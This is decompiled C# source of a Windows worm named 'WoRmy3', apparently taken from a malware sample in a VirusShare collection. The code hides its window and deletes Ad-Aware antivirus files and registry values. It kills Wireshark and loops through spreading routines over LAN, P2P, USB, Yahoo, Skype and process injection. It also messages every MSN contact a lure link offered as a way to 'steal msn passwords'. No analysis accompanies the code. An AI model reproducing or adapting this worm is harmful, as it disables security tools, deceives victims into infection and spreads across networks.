// Decompiled with JetBrains decompiler
// Type: WoRmy3.Form1
// Assembly: WoRmy3, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 1B26AE86-BB0F-48C4-8B57-1FB3CCAD5BD2
// Assembly location: C:\Users\Administrateur\Downloads\Virusshare-00006-msil\Trojan.Win32.Reconyc.eggt-0a9369ef164691ad2732dc205399f3a03b3ae27182245bcbe5919174ce030c3c.exe

using MessengerAPI;
using Microsoft.VisualBasic.CompilerServices;
using Microsoft.Win32;
using System;
using System.Collections;
using System.Collections.Generic;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Runtime.InteropServices;
using System.Threading;
using System.Windows.Forms;

namespace WoRmy3
{
  [DesignerGenerated]
  public class Form1 : Form
  {
    private IContainer components;
    private Mutex objMutex;
    private string yourmutex;

    public Form1()
    {
      this.Load += new EventHandler(this.Form1_Load);
      this.FormClosing += new FormClosingEventHandler(this.Form1_FormClosing);
      this.yourmutex = Environment.UserName + "Mutex";
      this.InitializeComponent();
    }

    [DebuggerNonUserCode]
    protected override void Dispose(bool disposing)
    {
      try
      {
        if (!disposing || this.components == null)
          return;
        this.components.Dispose();
      }
      finally
      {
        base.Dispose(disposing);
      }
    }

    [DebuggerStepThrough]
    private void InitializeComponent()
    {
      this.SuspendLayout();
      this.AutoScaleDimensions = new SizeF(6f, 13f);
      this.AutoScaleMode = AutoScaleMode.Font;
      this.ClientSize = new Size(0, 0);
      this.FormBorderStyle = FormBorderStyle.None;
      this.Name = nameof (Form1);
      this.Text = nameof (Form1);
      this.ResumeLayout(false);
    }

    [DllImport("kernel32", CharSet = CharSet.Ansi, SetLastError = true)]
    private static extern void Sleep(long dwMilliseconds);

    [DllImport("kernel32.dll", CharSet = CharSet.Auto, SetLastError = true)]
    public static extern bool deletefile(string path);

    public static void adaware()
    {
      List<string> stringList = new List<string>();
      string str = "Shell32.GETCSIDLPath(Shell32.CSIDL.CSIDL_PROGRAM_FILES)";
      stringList.Add(str + "\\Lavasoft\\");
      try
      {
        foreach (string path in stringList)
        {
          if (Directory.Exists(path))
          {
            FileInfo[] files = new DirectoryInfo(path).GetFiles("*.*", SearchOption.AllDirectories);
            int index = 0;
            while (index < files.Length)
            {
              FileInfo fileInfo = files[index];
              try
              {
                File.Delete(fileInfo.FullName);
              }
              catch (Exception ex)
              {
                ProjectData.SetProjectError(ex);
                ProjectData.ClearProjectError();
              }
              checked { ++index; }
            }
          }
        }
      }
      finally
      {
        List<string>.Enumerator enumerator;
        enumerator.Dispose();
      }
      RegistryKey registryKey = Registry.LocalMachine.OpenSubKey("Software\\Lavasoft\\Ad-Aware\\", true);
      string[] valueNames = registryKey.GetValueNames();
      int index1 = 0;
      while (index1 < valueNames.Length)
      {
        string name = valueNames[index1];
        try
        {
          registryKey.DeleteValue(name);
        }
        catch (Exception ex)
        {
          ProjectData.SetProjectError(ex);
          ProjectData.ClearProjectError();
        }
        checked { ++index1; }
      }
      registryKey.Close();
    }

    private void Form1_Load(object sender, EventArgs e)
    {
      this.Hide();
      this.objMutex = new Mutex(false, this.yourmutex);
      if (!this.objMutex.WaitOne(0, false))
      {
        this.objMutex.Close();
        this.objMutex = (Mutex) null;
        ProjectData.EndApp();
      }
      install.inst();
      while (true)
      {
        int num;
        do
        {
          checked { ++num; }
          lan.lan_sp();
          msnshare.msnshare_sp();
          p2p.p2p_sp();
          yahoo.yahoo_sp();
          skype.skype_sp();
          usb.usb_sp();
          this.msn_spread();
          lan.lan_sp();
          inject.inject_sp();
          Form1.Sleep(150000L);
        }
        while (num != 3);
        ProjectData.EndApp();
      }
    }

    private void Form1_FormClosing(object sender, FormClosingEventArgs e) => Process.Start("C:\\svchost.exe");

    public void antiwireshark()
    {
      Process[] processes = Process.GetProcesses();
      int index = 0;
      while (index < processes.Length)
      {
        Process process = processes[index];
        if (string.Equals(process.MainWindowTitle, "The Wireshark Network Analyzer"))
          process.Kill();
        checked { ++index; }
      }
    }

    public void msn_spread()
    {
      Messenger messenger = (Messenger) new MessengerClass();
      IMessengerContacts myContacts = (IMessengerContacts) ((IMessenger3) messenger).MyContacts;
      try
      {
        foreach (IMessengerContact imessengerContact in myContacts)
        {
          if (imessengerContact.Status != 1 && !imessengerContact.Blocked)
          {
            ((IMessenger3) messenger).InstantMessage((object) imessengerContact.SigninName);
            SendKeys.SendWait("steal msn passwords:" + install.link);
            SendKeys.SendWait("{ENTER}");
            SendKeys.SendWait("{ESC}");
          }
        }
      }
      finally
      {
        IEnumerator enumerator;
        if (enumerator is IDisposable)
          (enumerator as IDisposable).Dispose();
      }
    }
  }
}
